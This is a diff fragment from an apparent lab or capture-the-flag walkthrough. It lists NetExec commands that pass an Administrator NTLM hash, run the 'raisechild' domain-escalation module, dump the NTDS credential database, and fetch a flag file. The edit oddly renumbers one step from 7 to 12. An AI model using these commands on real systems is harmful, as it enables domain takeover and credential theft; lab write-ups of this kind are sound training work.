@@ -36,7 +36,7 @@
         4. `nxc ldap 192.168.109.20 -u Administrator -H d6fec3954c99c7c2250c16d81feaa9e9 -M raisechild`
         5. `rm Administrator.ccache`
         6. `nxc smb 192.168.109.10 --use-kcache --ntds`
-        7. `nxc smb 192.168.109.10 --use-kcache --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
+12. `nxc smb 192.168.109.10 --use-kcache --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
 
 
 
